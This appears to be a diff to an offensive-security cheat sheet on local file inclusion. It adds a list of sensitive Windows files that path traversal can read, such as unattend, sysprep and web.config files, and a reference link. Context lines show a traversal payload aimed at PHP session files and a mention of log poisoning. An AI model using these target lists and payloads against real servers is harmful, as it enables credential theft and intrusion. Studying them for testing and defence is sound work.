@@ -18,7 +18,7 @@ The File Inclusion vulnerability allows an attacker to include a file, usually e
 * [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
 
 
-Interesting files to check out :
+Linux - Interesting files to check out :
 ```
 /etc/issue
 /etc/passwd
@@ -38,6 +38,32 @@ Interesting files to check out :
 /proc/net/tcp
 /proc/net/udp
 ```
+
+Windows - Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)
+```
+c:/boot.ini
+c:/inetpub/logs/logfiles
+c:/inetpub/wwwroot/global.asa
+c:/inetpub/wwwroot/index.asp
+c:/inetpub/wwwroot/web.config
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system32/inetsrv/metabase.xml
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system volume information/wpsettings.dat
+c:/system32/inetsrv/metabase.xml
+c:/unattend.txt
+c:/unattend.xml
+c:/unattended.txt
+c:/unattended.xml
+```
+
+
 The following log files are controllable and can be included with an evil payload to achieve a command execution
 ```
 /var/log/apache/access.log
@@ -211,3 +237,4 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 * [Upgrade from LFI to RCE via PHP Sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)
 * [Local file inclusion tricks](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
 * [CVV #1: Local File Inclusion - SI9INT](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
+* [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos](http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
